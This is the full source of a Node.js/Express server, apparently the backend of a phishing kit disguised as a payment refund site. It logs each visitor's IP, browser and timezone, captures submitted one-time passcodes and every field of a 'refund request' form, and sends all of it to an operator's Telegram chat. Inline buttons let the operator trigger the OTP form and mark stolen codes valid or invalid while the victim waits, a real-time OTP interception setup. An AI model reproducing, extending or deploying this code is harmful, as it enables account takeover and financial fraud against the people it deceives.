// server.js (Node.js + Express)

console.log('⏳ Heroku loaded BOT_TOKEN:', JSON.stringify(process.env.BOT_TOKEN));

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const path        = require('path');
const TelegramBot = require('node-telegram-bot-api');
const cors        = require('cors');

// --- Configuration ---
const BOT_TOKEN     = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const PORT          = process.env.PORT || 3000;

// In‑memory store (swap for Redis/DB in production)
const store = new Map();

// Initialize Express
const app = express();

// 1) Enable CORS if you need it for a custom domain
//    (adjust or remove origin as appropriate)
app.use(cors({
  origin: 'https://pay.yourdomain.com',
  credentials: true
}));

app.use(bodyParser.json());
app.use(session({
  secret: 'your-session-secret',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // set to true if you serve over HTTPS only
}));

// === Static page serving ===

// Serve index.html at the root URL
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve any other file from the project root:
//   loading.html → /loading.html
//   refund.html  → /refund.html
//   success.html → /success.html
//   js/*, style/*, img/*, etc.
app.use(express.static(path.join(__dirname)));


// --- Telegram bot setup ---
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Helper to find session ID by Telegram chat ID
function findSessionByChatId(chatId) {
  for (let [sid, sess] of store) {
    if (sess.chatId === chatId) return sid;
  }
  return null;
}


// --- API routes ---

// 0) Bind‑refund (called from refund.html)
app.post('/bind-refund', (req, res) => {
  const { chatId, ua, tz } = req.body;
  const sess = store.get(req.session.id) || {};
  sess.chatId    = chatId;
  sess.ip        = req.ip;
  sess.userAgent = ua;
  sess.timezone  = tz;
  store.set(req.session.id, sess);

  bot.sendMessage(chatId,
    `🆕 Refund session started\n` +
    `<b>IP:</b> ${sess.ip}\n` +
    `<b>UA:</b> ${ua}\n` +
    `<b>TZ:</b> ${tz}`,
    { parse_mode: 'HTML' }
  );

  res.sendStatus(200);
});

// 1) Bind‑chat (called from loading.html to start OTP flow)
app.post('/bind-chat', (req, res) => {
  const { chatId, ua, tz } = req.body;
  const sess = {
    chatId,
    ready: false,
    method: null,
    ip: req.ip,
    userAgent: ua,
    timezone: tz
  };
  store.set(req.session.id, sess);

  bot.sendMessage(chatId,
    `🆕 New session bound\n` +
    `<b>IP:</b> ${sess.ip}\n` +
    `<b>UA:</b> ${ua}\n` +
    `<b>TZ:</b> ${tz}`,
    {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'OTP via Phone', callback_data: 'startOtp:phone' },
            { text: 'OTP via Email', callback_data: 'startOtp:email' }
          ]
        ]
      }
    }
  );

  res.sendStatus(200);
});

// 2) Poll for OTP readiness
app.get('/otp-status', (req, res) => {
  const sess = store.get(req.session.id) || {};
  res.json({
    ready: sess.ready || false,
    method: sess.method || null,
    phoneLast4: sess.phoneLast4 || null
  });
});

// 3) Receive OTP submission
app.post('/submit-otp', (req, res) => {
  const { otp, ua, tz } = req.body;
  const sess = store.get(req.session.id) || {};
  sess.submittedOtp = otp;
  sess.subUA        = ua;
  sess.subTZ        = tz;
  delete sess.valid;
  store.set(req.session.id, sess);

  if (sess.chatId) {
    bot.sendMessage(sess.chatId,
      `🔐 OTP Submission\n` +
      `<b>Session:</b> ${req.session.id}\n` +
      `<b>OTP:</b> <code>${otp}</code>\n` +
      `<b>UA:</b> ${ua}\n` +
      `<b>TZ:</b> ${tz}`,
      {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ Valid OTP',   callback_data: 'verifyOtp:ok' },
              { text: '❌ Invalid OTP', callback_data: 'verifyOtp:fail' }
            ]
          ]
        }
      }
    );
  }

  res.sendStatus(200);
});

// 4) Poll for OTP verification result
app.get('/otp-verify-status', (req, res) => {
  const sess = store.get(req.session.id) || {};
  res.json({
    valid: typeof sess.valid === 'boolean' ? sess.valid : null
  });
});

// 5) Receive refund requests
app.post('/refund', (req, res) => {
  const data = req.body;
  const sess = store.get(req.session.id) || {};
  if (sess.chatId) {
    let msg = `📝 Refund Request\n<b>Session:</b> ${req.session.id}\n`;
    Object.entries(data).forEach(([k, v]) => {
      msg += `<b>${k}:</b> ${v}\n`;
    });
    msg += `<b>IP:</b> ${sess.ip}\n`;
    bot.sendMessage(sess.chatId, msg, { parse_mode: 'HTML' });
  }
  res.sendStatus(200);
});


// --- Telegram callback handlers ---
bot.on('callback_query', query => {
  const [action, param] = query.data.split(':');
  const chatId    = query.message.chat.id;
  const sessionId = findSessionByChatId(chatId);

  if (action === 'startOtp' && sessionId) {
    const sess = store.get(sessionId);
    sess.ready  = true;
    sess.method = param === 'phone' ? 'phone' : 'email';
    store.set(sessionId, sess);
    bot.answerCallbackQuery(query.id, { text: `OTP via ${param} selected` });
    bot.sendMessage(chatId, `🔔 OTP form enabled via ${param}.`);

  } else if (action === 'verifyOtp' && sessionId) {
    const sess = store.get(sessionId);
    sess.valid = (param === 'ok');
    store.set(sessionId, sess);
    bot.answerCallbackQuery(query.id, {
      text: sess.valid ? '✅ Marked valid' : '❌ Marked invalid'
    });
    bot.sendMessage(chatId,
      sess.valid ? '✅ OTP marked valid.' : '❌ OTP marked invalid.'
    );

  } else {
    bot.answerCallbackQuery(query.id, { text: 'No active session found.' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
